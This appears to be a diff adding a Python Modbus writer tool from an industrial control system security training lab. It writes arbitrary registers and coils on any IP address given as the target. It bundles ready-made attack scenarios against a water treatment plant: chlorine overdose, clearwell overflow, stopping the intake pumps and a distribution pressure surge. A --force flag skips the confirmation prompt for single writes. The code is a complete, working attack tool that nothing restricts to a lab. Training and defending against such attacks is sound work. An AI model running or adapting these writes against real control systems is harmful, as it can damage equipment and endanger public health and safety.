@@ -1,0 +1,217 @@
+#!/usr/bin/env python3
+"""
+VULNOT Modbus Writer
+Write values to Modbus registers and coils
+
+⚠️  WARNING: This tool can manipulate industrial control systems.
+    Use only in training environments!
+"""
+
+import argparse
+import sys
+from pymodbus.client import ModbusTcpClient
+from rich.console import Console
+from rich.panel import Panel
+from rich.prompt import Confirm
+
+console = Console()
+
+# Attack scenarios for training
+ATTACK_SCENARIOS = {
+    'overflow_clearwell': {
+        'name': 'Clearwell Overflow Attack',
+        'description': 'Set distribution pumps to 0%, causing clearwell to overflow',
+        'target': 3,  # PLC-DISTRIBUTION
+        'actions': [
+            ('register', 3, 0, 'Set P301 speed to 0%'),
+            ('register', 4, 0, 'Set P302 speed to 0%'),
+        ]
+    },
+    'chlorine_spike': {
+        'name': 'Chlorine Overdose Attack',
+        'description': 'Increase chlorine dosing to dangerous levels',
+        'target': 2,  # PLC-TREATMENT
+        'actions': [
+            ('register', 4, 5000, 'Set chlorine flow to max'),
+            ('register', 9, 10000, 'Open chemical valve 100%'),
+        ]
+    },
+    'pump_stop': {
+        'name': 'Pump Shutdown Attack',
+        'description': 'Stop all intake pumps',
+        'target': 1,  # PLC-INTAKE
+        'actions': [
+            ('coil', 0, False, 'Stop Pump P101'),
+            ('coil', 1, False, 'Stop Pump P102'),
+        ]
+    },
+    'pressure_surge': {
+        'name': 'Pressure Surge Attack',
+        'description': 'Max out distribution pumps causing pressure spike',
+        'target': 3,  # PLC-DISTRIBUTION
+        'actions': [
+            ('register', 3, 10000, 'Set P301 speed to 100%'),
+            ('register', 4, 10000, 'Set P302 speed to 100%'),
+            ('coil', 0, True, 'Start Pump P301'),
+            ('coil', 1, True, 'Start Pump P302'),
+        ]
+    }
+}
+
+def write_register(client, unit_id, address, value):
+    """Write a single holding register"""
+    try:
+        result = client.write_register(address, value, slave=unit_id)
+        return not result.isError()
+    except Exception as e:
+        console.print(f"[red]Error writing register: {e}[/]")
+        return False
+
+def write_coil(client, unit_id, address, value):
+    """Write a single coil"""
+    try:
+        result = client.write_coil(address, value, slave=unit_id)
+        return not result.isError()
+    except Exception as e:
+        console.print(f"[red]Error writing coil: {e}[/]")
+        return False
+
+def execute_scenario(client, scenario_name):
+    """Execute a predefined attack scenario"""
+    if scenario_name not in ATTACK_SCENARIOS:
+        console.print(f"[red]Unknown scenario: {scenario_name}[/]")
+        return
+    
+    scenario = ATTACK_SCENARIOS[scenario_name]
+    
+    console.print(Panel(
+        f"[bold red]{scenario['name']}[/]\n\n{scenario['description']}",
+        title="⚠️  ATTACK SCENARIO",
+        border_style="red"
+    ))
+    
+    console.print("\n[yellow]Actions to be performed:[/]")
+    for action in scenario['actions']:
+        action_type, address, value, desc = action
+        console.print(f"  • {desc} ({action_type}[{address}] = {value})")
+    
+    if not Confirm.ask("\n[bold red]Execute attack scenario?[/]"):
+        console.print("[yellow]Aborted[/]")
+        return
+    
+    console.print("\n[red]Executing attack...[/]\n")
+    
+    for action in scenario['actions']:
+        action_type, address, value, desc = action
+        
+        if action_type == 'register':
+            success = write_register(client, scenario['target'], address, value)
+        else:
+            success = write_coil(client, scenario['target'], address, value)
+        
+        status = "[green]✓[/]" if success else "[red]✗[/]"
+        console.print(f"  {status} {desc}")
+    
+    console.print("\n[red bold]Attack complete![/]")
+    console.print("[dim]Monitor the HMI dashboard to observe the impact[/]\n")
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='VULNOT Modbus Writer - ⚠️  USE ONLY IN TRAINING',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Attack Scenarios:
+  --scenario overflow_clearwell    Stop distribution pumps (overflow)
+  --scenario chlorine_spike        Overdose chlorine
+  --scenario pump_stop             Stop intake pumps
+  --scenario pressure_surge        Max distribution pressure
+
+Examples:
+  vulnot-write -t 10.0.1.10 -r 2 -v 0        # Set register 2 to 0
+  vulnot-write -t 10.0.1.10 -c 0 -v 1        # Turn on coil 0
+  vulnot-write -t 10.0.1.10 --scenario pump_stop
+        """
+    )
+    parser.add_argument('-t', '--target', required=True,
+                        help='Target IP address')
+    parser.add_argument('-p', '--port', type=int, default=502,
+                        help='Modbus port (default: 502)')
+    parser.add_argument('-u', '--unit', type=int, default=1,
+                        help='Unit ID (default: 1)')
+    parser.add_argument('-r', '--register', type=int,
+                        help='Register address to write')
+    parser.add_argument('-c', '--coil', type=int,
+                        help='Coil address to write')
+    parser.add_argument('-v', '--value', type=int,
+                        help='Value to write')
+    parser.add_argument('--scenario', choices=ATTACK_SCENARIOS.keys(),
+                        help='Execute predefined attack scenario')
+    parser.add_argument('--force', action='store_true',
+                        help='Skip confirmation prompts')
+    
+    args = parser.parse_args()
+    
+    console.print("\n[bold red]╔════════════════════════════════════════╗[/]")
+    console.print("[bold red]║      VULNOT Modbus Register Writer     ║[/]")
+    console.print("[bold red]║   ⚠️  DANGER - MODIFIES PROCESS VALUES  ║[/]")
+    console.print("[bold red]╚════════════════════════════════════════╝[/]\n")
+    
+    # Validate arguments
+    if not args.scenario and (args.register is None and args.coil is None):
+        console.print("[red]Error: Must specify --register, --coil, or --scenario[/]")
+        sys.exit(1)
+    
+    if (args.register is not None or args.coil is not None) and args.value is None:
+        console.print("[red]Error: Must specify --value when writing[/]")
+        sys.exit(1)
+    
+    # Connect to device
+    console.print(f"[yellow]Connecting to {args.target}:{args.port}...[/]")
+    
+    client = ModbusTcpClient(args.target, port=args.port)
+    if not client.connect():
+        console.print("[red]Failed to connect to target[/]")
+        sys.exit(1)
+    
+    console.print("[green]Connected![/]\n")
+    
+    # Execute scenario or single write
+    if args.scenario:
+        execute_scenario(client, args.scenario)
+    
+    elif args.register is not None:
+        console.print(f"[yellow]Writing {args.value} to register {args.register} on unit {args.unit}[/]")
+        
+        if not args.force:
+            if not Confirm.ask("[bold red]Confirm write operation?[/]"):
+                console.print("[yellow]Aborted[/]")
+                client.close()
+                sys.exit(0)
+        
+        success = write_register(client, args.unit, args.register, args.value)
+        if success:
+            console.print(f"[green]✓ Successfully wrote {args.value} to HR[{args.register}][/]")
+        else:
+            console.print(f"[red]✗ Failed to write to HR[{args.register}][/]")
+    
+    elif args.coil is not None:
+        value = bool(args.value)
+        console.print(f"[yellow]Writing {'ON' if value else 'OFF'} to coil {args.coil} on unit {args.unit}[/]")
+        
+        if not args.force:
+            if not Confirm.ask("[bold red]Confirm write operation?[/]"):
+                console.print("[yellow]Aborted[/]")
+                client.close()
+                sys.exit(0)
+        
+        success = write_coil(client, args.unit, args.coil, value)
+        if success:
+            console.print(f"[green]✓ Successfully wrote {'ON' if value else 'OFF'} to COIL[{args.coil}][/]")
+        else:
+            console.print(f"[red]✗ Failed to write to COIL[{args.coil}][/]")
+    
+    client.close()
+    console.print("\n[dim]Connection closed[/]\n")
+
+if __name__ == '__main__':
+    main()
